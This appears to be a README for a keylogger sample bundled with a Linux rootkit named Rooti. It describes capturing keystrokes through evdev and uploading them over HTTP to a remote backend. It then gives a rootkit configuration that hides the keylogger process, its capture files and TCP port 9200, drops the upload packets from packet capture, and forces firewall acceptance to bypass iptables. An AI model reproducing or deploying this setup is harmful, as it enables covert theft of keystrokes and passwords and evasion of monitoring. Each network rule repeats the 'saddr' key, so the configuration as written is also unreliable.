## Keylogger Sample
This is a simple userspace keylogger which relies on the `evdev` interface.  
The program captures keystrokes via an input character device file, buffers the results on disk and  
periodically sends them to a remote server via HTTP.

This sample is meant to showcase some of the features of Rooti in action:
  * Hiding the keylogger process
  * Hiding the keystrokes capture file
  * Hiding the TCP connection to the backend server
  * Hiding network packets of upload requests
  * Bypassing iptables rules, ensuring the server could be reached

#### Rootkit Integration
Rooti should be precompiled and embedded inside the sample binary (this is handled by the Makefile).
Suitable configuration of the rootkit would be:
```json
// Presented in JSON format for readability.
// Actual configuration shall be hardcoded into the module.
{
  "hide_child_processes": false,
  "debug_showme": false,
  "debug_logging": false,
  "hidden_files": [".keylogger"],
  "hidden_files_prefixes": ["capture."],
  "hidden_files_suffixes": [],
  "hidden_users": [],
  "hidden_tcp_ports": [9200],
  "hidden_udp_ports": [],
  "pcap_policy": {
    "type": "ROOTI_NET_POLICY_BLACKLIST",
    "rules": [
      {
        "saddr": "<target-host>",
        "saddr": "<backend-host>",
        "protocol": "IPPROTO_TCP",
        "dport": 9200,
        "action": "ROOTI_PACKET_DROP"
      },
      {
        "saddr": "<backend-host>",
        "saddr": "<target-host>",
        "protocol": "IPPROTO_TCP",
        "sport": 9200,
        "action": "ROOTI_PACKET_DROP"
      }
    ]
  },
  "firewall_policy": {
    "type": "ROOTI_NET_POLICY_BLACKLIST",
    "rules": [
      {
        "saddr": "<target-host>",
        "saddr": "<backend-host>",
        "protocol": "IPPROTO_TCP",
        "dport": 9200,
        "action": "ROOTI_PACKET_ACCEPT"
      },
      {
        "saddr": "<backend-host>",
        "saddr": "<target-host>",
        "protocol": "IPPROTO_TCP",
        "sport": 9200,
        "action": "ROOTI_PACKET_ACCEPT"
      }
    ]
  }
}
```
